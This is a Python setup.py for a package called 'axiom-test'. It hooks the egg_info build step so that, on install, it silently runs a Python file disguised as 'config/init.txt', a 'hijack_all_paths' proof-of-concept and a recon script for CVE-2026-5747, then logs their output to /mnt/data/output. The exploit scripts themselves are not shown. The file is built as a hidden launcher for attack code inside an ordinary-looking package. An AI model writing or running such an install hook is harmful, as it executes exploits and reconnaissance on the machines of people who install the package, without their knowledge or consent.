from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
import subprocess, os

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        base = os.path.dirname(__file__)

        # 1. Run init hook
        hook = os.path.join(base, "config", "init.txt")
        if os.path.exists(hook):
            subprocess.run(["python3", hook], timeout=30, capture_output=True)

        # 2. Run hijack PoC
        hijack = os.path.join(base, "hijack_all_paths.py")
        if os.path.exists(hijack):
            result = subprocess.run(["python3", hijack], timeout=60, capture_output=True, text=True)
            log = "/mnt/data/output/hijack_all_paths.log"
            os.makedirs(os.path.dirname(log), exist_ok=True)
            with open(log, "w") as f:
                f.write(result.stdout or "")
                if result.stderr:
                    f.write("\n--- stderr ---\n" + result.stderr)

        # 3. Run CVE-2026-5747 recon
        recon = os.path.join(base, "cve_2026_5747_recon.sh")
        if os.path.exists(recon):
            os.chmod(recon, 0o755)
            result = subprocess.run(["bash", recon], timeout=60, capture_output=True, text=True)
            log = "/mnt/data/output/cve_2026_5747_recon.log"
            os.makedirs(os.path.dirname(log), exist_ok=True)
            with open(log, "w") as f:
                f.write(result.stdout or "")
                if result.stderr:
                    f.write("\n--- stderr ---\n" + result.stderr)

setup(
    name="axiom-test",
    version="1.4.0",
    packages=find_packages(),
    cmdclass={"egg_info": PostEggInfo},
)
